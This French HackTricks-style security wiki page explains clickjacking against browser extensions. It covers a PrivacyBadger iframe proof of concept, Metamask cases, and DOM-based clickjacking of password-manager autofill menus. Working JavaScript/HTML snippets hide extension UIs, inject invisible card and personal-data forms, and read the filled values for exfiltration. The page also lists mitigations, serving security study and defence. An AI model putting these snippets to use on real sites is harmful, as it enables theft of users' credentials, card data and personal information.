# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

Cette page va exploiter une vulnérabilité de ClickJacking dans une extension de navigateur.\
Si vous ne savez pas ce qu'est ClickJacking, consultez :


{{#ref}}
../clickjacking.md
{{#endref}}

Les extensions contiennent le fichier **`manifest.json`** et ce fichier JSON possède un champ `web_accessible_resources`. Voici ce que [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) disent à ce sujet :

> These resources would then be available in a webpage via the URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Les `web_accessible_resources` d'une extension de navigateur ne sont pas seulement accessibles via le web ; elles s'exécutent également avec les privilèges inhérents de l'extension. Cela signifie qu'elles peuvent :

- Modifier l'état de l'extension
- Charger des ressources additionnelles
- Interagir avec le navigateur dans une certaine mesure

Cependant, cette fonctionnalité présente un risque de sécurité. Si une ressource incluse dans `web_accessible_resources` contient une fonctionnalité significative, un attaquant pourrait potentiellement intégrer cette ressource dans une page web externe. Des utilisateurs non méfiants visitant cette page pourraient activer involontairement cette ressource intégrée. Une telle activation pourrait entraîner des conséquences imprévues, selon les permissions et les capacités des ressources de l'extension.

## PrivacyBadger Example

Dans l'extension PrivacyBadger, une vulnérabilité a été identifiée liée au répertoire `skin/` déclaré comme `web_accessible_resources` de la manière suivante (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Cette configuration a entraîné un problème de sécurité potentiel. Plus précisément, le fichier `skin/popup.html`, qui est affiché lors de l'interaction avec l'icône PrivacyBadger dans le navigateur, pouvait être intégré dans un `iframe`. Cette intégration pouvait être exploitée pour tromper les utilisateurs et les amener à cliquer involontairement sur "Disable PrivacyBadger for this Website". Une telle action compromettrait la vie privée de l'utilisateur en désactivant la protection PrivacyBadger et pourrait exposer l'utilisateur à un suivi accru. Une démonstration visuelle de cet exploit est disponible dans une vidéo ClickJacking à l'adresse [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Pour corriger cette vulnérabilité, une solution simple a été mise en place : la suppression de `/skin/*` de la liste des `web_accessible_resources`. Ce changement a efficacement atténué le risque en garantissant que le contenu du répertoire `skin/` ne puisse pas être accédé ou manipulé via `web_accessible_resources`.

Le correctif a été simple : **supprimer `/skin/*` des `web_accessible_resources`.**

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemple Metamask

Un [**article de blog sur un ClickJacking dans metamask se trouve ici**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Dans ce cas, Metamask a corrigé la vulnérabilité en vérifiant que le protocole utilisé pour y accéder était **`https:`** ou **`http:`** (et non **`chrome:`**, par exemple) :

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Une autre vulnérabilité ClickJacking** corrigée dans l'extension Metamask permettait aux utilisateurs de Click to whitelist lorsqu'une page était suspecte de phishing à cause de `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Comme cette page était vulnérable au Clickjacking, un attaquant pouvait en abuser en affichant quelque chose de normal pour amener la victime à Click to whitelist sans s'en rendre compte, puis revenir à la page de phishing qui serait alors whitelisted.

## Exemple Steam Inventory Helper

Consultez la page suivante pour voir comment une **XSS** dans une extension de navigateur a été enchaînée avec une vulnérabilité **ClickJacking** :


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Le clickjacking classique d'extension abuse des `web_accessible_resources` mal configurées pour iframer du HTML privilégié et provoquer des clics utilisateur. Une nouvelle catégorie, DOM-based extension clickjacking, cible les dropdowns d'autofill injectés par les password managers directement dans le DOM de la page et utilise des astuces CSS/DOM pour les masquer ou les occulter tout en les gardant cliquables. Un seul clic contraint peut sélectionner un élément stocké et remplir des champs contrôlés par l'attaquant avec des données sensibles.

### Modèle de menace

- L'attaquant contrôle une page web (ou obtient une XSS/prise de contrôle de sous-domaine/empoisonnement de cache sur un domaine lié).
- La victime a une extension password manager installée et déverrouillée (certaines effectuent de l'autofill même lorsqu'elles sont nominalement verrouillées).
- Au moins un clic utilisateur est induit (bannières de cookies superposées, dialogues, CAPTCHAs, jeux, etc.).

### Flux d'attaque (autofill manuel)

1. Injecter un formulaire invisible mais focalisable (champs login/PII/carte de crédit).
2. Focaliser un input pour faire apparaître le dropdown d'autofill de l'extension près du champ.
3. Masquer ou occulter l'UI de l'extension tout en la gardant cliquable.
4. Aligner un contrôle crédible sous le dropdown masqué pour provoquer un clic qui sélectionne un élément.
5. Lire les valeurs remplies depuis le formulaire de l'attaquant et exfiltrer.

### Comment cacher l'UI d'autofill

- Élément de l'extension
- Opacité de l'élément racine (générique):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Enfant à l'intérieur d'un ShadowRoot ouvert (balise dynamique, masquer l'iframe interne):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Élément parent
- BODY/HTML opacity tricks pour rendre l'extension UI invisible alors que la page semble normale (p. ex., arrière-plan de la capture d'écran) :
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Superposition
- Superposition partielle : occulter tout sauf quelques pixels afin que le menu déroulant reste cliquable (assurez-vous que la superposition de l'attaquant est la dernière dans le DOM avec un max z-index, ou utilisez Top Layer).
- Superposition complète en utilisant pointer-events:none afin que les clics passent au travers vers le menu déroulant caché ; gardez-la persistante avec le Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Positionnement du clic de la victime

- Placement fixe : positionnez le menu déroulant caché sous un contrôle crédible tel que “Accepter les cookies”, “Fermer” ou une case à cocher CAPTCHA.
- Suivre la souris : déplacez le champ focalisé sous le curseur pour que le menu déroulant le suive ; refocalisez périodiquement pour qu'un seul clic n'importe où sélectionne un élément :
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Impact et scénarios

- Site contrôlé par un attaquant : un seul clic contraint peut exfiltrer des données de carte de crédit (numéro/date d’expiration/CVC) et des informations personnelles (nom, email, téléphone, adresse, date de naissance (DOB)) qui ne sont pas limitées au domaine.
- Site de confiance avec XSS/subdomain takeover/cache poisoning : vol en plusieurs clics d’identifiants (username/password) et TOTP, car de nombreux gestionnaires font autofill à travers des sous-domaines/domaines parents liés (par ex., `*.example.com`).
- Passkeys : si le RP n’associe pas les challenges WebAuthn à la session, XSS peut intercepter l’assertion signée ; le DOM-based clickjacking cache l’invite de passkey pour provoquer le clic de confirmation de l’utilisateur.

### Limitations

- Nécessite au moins un clic utilisateur et un bon alignement des pixels (des overlays réalistes facilitent la sollicitation de clics).
- Le verrouillage automatique / la déconnexion réduisent les fenêtres d’exploitation ; certains gestionnaires effectuent toujours l’autofill même lorsqu'ils sont verrouillés.

### Mesures d'atténuation pour les développeurs d'extensions

- Afficher l'autofill UI dans la Top Layer (Popover API) ou s'assurer autrement qu'elle se trouve au-dessus de l'empilement de la page ; éviter d'être recouvert par des overlays contrôlés par la page.
- Résister aux altérations CSS : privilégier Closed Shadow DOM et surveiller avec `MutationObserver` les changements de style suspects sur les racines UI.
- Détecter les overlays hostiles avant le remplissage : énumérer les autres éléments top-layer/popover, désactiver temporairement `pointer-events:none` et utiliser `elementsFromPoint()` pour détecter l'occlusion ; fermer l'UI si des overlays existent.
- Détecter les changements suspects d'opacité ou de style sur `<body>`/`<html>` avant et après le rendu.
- Pour les problèmes basés sur iframe : restreindre étroitement les `matches` de MV3 `web_accessible_resources` et éviter d'exposer des UIs HTML ; pour les HTML inévitables, servir `X-Frame-Options: DENY` ou `Content-Security-Policy: frame-ancestors 'none'`.

## Références

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
